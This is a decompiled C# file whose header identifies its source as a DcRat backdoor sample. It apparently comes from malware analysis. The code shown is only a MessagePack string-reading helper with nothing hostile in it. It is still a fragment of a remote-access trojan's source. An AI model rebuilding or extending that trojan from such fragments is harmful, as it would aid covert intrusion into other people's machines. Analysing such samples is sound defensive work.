// Decompiled with JetBrains decompiler
// Type: MessagePackLib.MessagePack.ReadTools
// Assembly: Hau, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 43E252B6-B9CE-452D-8541-D8645EC414DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.DcRat.gen-b46a6ed5d0d601aa0e1087095ddea928405c927d65ab795aca3a148d2fb37d13.exe

using System;
using System.IO;

namespace MessagePackLib.MessagePack
{
  internal class ReadTools
  {
    public static string ReadString(Stream ms, int len)
    {
      byte[] numArray = new byte[len];
      ms.Read(numArray, 0, len);
      return BytesTools.GetString(numArray);
    }

    public static string ReadString(Stream ms) => ReadTools.ReadString((byte) ms.ReadByte(), ms);

    public static string ReadString(byte strFlag, Stream ms)
    {
      int count = 0;
      if (strFlag >= (byte) 160 && strFlag <= (byte) 191)
      {
        count = (int) strFlag - 160;
      }
      else
      {
        switch (strFlag)
        {
          case 217:
            count = ms.ReadByte();
            break;
          case 218:
            byte[] numArray1 = new byte[2];
            ms.Read(numArray1, 0, 2);
            count = (int) BitConverter.ToUInt16(BytesTools.SwapBytes(numArray1), 0);
            break;
          case 219:
            byte[] numArray2 = new byte[4];
            ms.Read(numArray2, 0, 4);
            count = BitConverter.ToInt32(BytesTools.SwapBytes(numArray2), 0);
            break;
        }
      }
      byte[] numArray3 = new byte[count];
      ms.Read(numArray3, 0, count);
      return BytesTools.GetString(numArray3);
    }
  }
}
